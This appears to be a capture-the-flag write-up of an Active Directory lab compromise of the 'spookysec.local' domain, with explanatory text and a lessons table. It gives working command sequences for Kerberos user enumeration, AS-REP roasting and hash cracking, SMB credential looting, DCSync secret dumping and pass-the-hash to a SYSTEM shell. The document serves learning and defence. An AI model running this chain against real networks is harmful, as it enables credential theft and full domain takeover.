02 - Recon

Kerberos Surface & User Enumeration

What pointed us here Port 88 was open, so Kerberos was directly reachable. In AD, that means we can often validate usernames before having a password. This is better than guessing through SMB because Kerberos gives cleaner account-state feedback.

The first useful step was to identify valid usernames. Kerberos user enumeration works because the KDC responds differently when the principal exists. We are not trying to log in yet. We are asking the KDC which names are real enough to receive Kerberos processing.

# Enumerate valid users against the KDC
kerbrute userenum \
    --dc <target-ip> \
    -d spookysec.local \
    userlist.txt

[+] VALID USERNAME: svc-admin@spookysec.local
[+] VALID USERNAME: backup@spookysec.local

The account that mattered immediately was svc-admin. Service accounts often carry old passwords and weak pre-authentication settings. That combination is exactly what AS-REP roasting needs.

03 - Credential Access

AS-REP Roasting svc-admin

What pointed us here svc-admin looked like a service identity and Kerberos was exposed. The next question was simple: does this account have DONT_REQ_PREAUTH enabled? If yes, the KDC will return crackable encrypted material without us knowing the password.

AS-REP roasting abuses a configuration mistake, not a software bug. Normally, Kerberos pre-authentication forces the client to prove knowledge of the password before the KDC sends anything useful. If pre-auth is disabled, the KDC sends an AS-REP encrypted with the user's key. We take that blob offline and crack it.

# Request AS-REP material for users that do not require pre-auth
impacket-GetNPUsers \
    spookysec.local/ \
    -dc-ip <target-ip> \
    -usersfile users.txt \
    -no-pass \
    -outputfile asrep.hashes

# Crack the AS-REP hash
hashcat -m 18200 -a 0 asrep.hashes /usr/share/wordlists/rockyou.txt --username

svc-admin:REDACTED_SVC_ADMIN_PASSWORD

At this point we had a real domain credential. Not admin, but enough to enumerate SMB shares and AD relationships properly.

04 - Loot

SMB Loot & Backup Credentials

What pointed us here A cracked service account is usually not the final account. The value is in what it can read. SMB share enumeration is the fastest way to turn one weak password into the next credential. 
# Enumerate readable shares using svc-admin
smbmap -H <target-ip> \
    -d spookysec.local \
    -u svc-admin \
    -p 'REDACTED_SVC_ADMIN_PASSWORD'

# Pull backup material from the readable share
smbclient //<target-ip>/backup \
    -U 'spookysec.local/svc-admin%REDACTED_SVC_ADMIN_PASSWORD'

smb: \> ls
smb: \> get backup_credentials.txt

The file was not encrypted. It was only base64 encoded. This matters operationally: base64 is not protection, it is just a transport encoding. Treat any credential-looking blob in a share as sensitive until proven otherwise.

# Decode the recovered credential
cat backup_credentials.txt | base64 -d

backup:REDACTED_BACKUP_PASSWORD
05 - Path Validation

BloodHound - Why the Backup Account Matters

What pointed us here The account name backup is suspicious by role. In Windows domains, backup operators and service backup identities are often over-permissioned because they need to touch sensitive files or directory data. BloodHound answers the important question: is this just a normal user, or does it have a path to domain compromise?

We collected AD data with the recovered credential and checked the account's effective rights. The point of BloodHound here was not to decorate the writeup with a graph. It was to confirm why the next step was legitimate: the backup identity could reach sensitive domain data.

# Collect domain data
bloodhound-python \
    -d spookysec.local \
    -u backup \
    -p 'REDACTED_BACKUP_PASSWORD' \
    -ns <target-ip> \
    -dc dc.spookysec.local \
    -c All

# Then inspect the backup account path in BloodHound

The useful interpretation is simple: a credential that can read or replicate directory secrets is effectively a domain-compromise credential, even if it is not named Administrator.

06 - Privilege Escalation

Domain Replication Abuse

What pointed us here The backup account gave us the right kind of access to domain secrets. In AD, the fastest way to turn that into full compromise is to ask the DC for replicated password data, then use the Administrator NTLM hash.

DCSync is not code execution. It is directory replication abuse. If an account has the required replication privileges, it can ask the domain controller for password material the same way another DC would. The DC is not being exploited. It is obeying permissions.

# Dump domain secrets with the backup credential
impacket-secretsdump \
    'spookysec.local/backup:REDACTED_BACKUP_PASSWORD@<target-ip>' \
    -dc-ip <target-ip> \
    -just-dc

Administrator:500:<empty-lm>:<administrator-ntlm>:::

The Administrator plaintext password was not needed. NTLM was enough because SMB and remote service creation accept pass-the-hash in this context.

07 - Impact

Pass-the-Hash to SYSTEM

With the Administrator NTLM hash, we used SMB remote execution. The payload lands as a Windows service, which is why the shell runs as NT AUTHORITY\SYSTEM instead of merely as the Administrator user context.

# Execute on the DC using the Administrator hash
impacket-psexec \
    -hashes ':<administrator-ntlm>' \
    'spookysec.local/Administrator@<target-ip>'

C:\Windows\system32> whoami
nt authority\system

10 - Lessons

Key Takeaways

ConceptLesson
Kerberos enumeration When port 88 is exposed, validate users through the KDC before touching noisy authentication paths. A username list is often enough to start the chain.
AS-REP roasting The issue is the absence of pre-authentication. The account gives you encrypted material before you know the password, and cracking happens offline.
SMB loot A cracked domain user should immediately be tested against SMB shares. Files named backup, credentials, deploy, old, or config deserve priority.
Base64 Base64 is not protection. It is only encoding. Decode first, then decide whether the data has security value.
DCSync Replication abuse is permission abuse. The DC is doing what the ACL permits, so detection has to focus on who is asking for replication, not only on exploit behavior.
Pass-the-hash Administrator NTLM is enough for remote execution when SMB accepts it. You do not need plaintext once the hash lands.
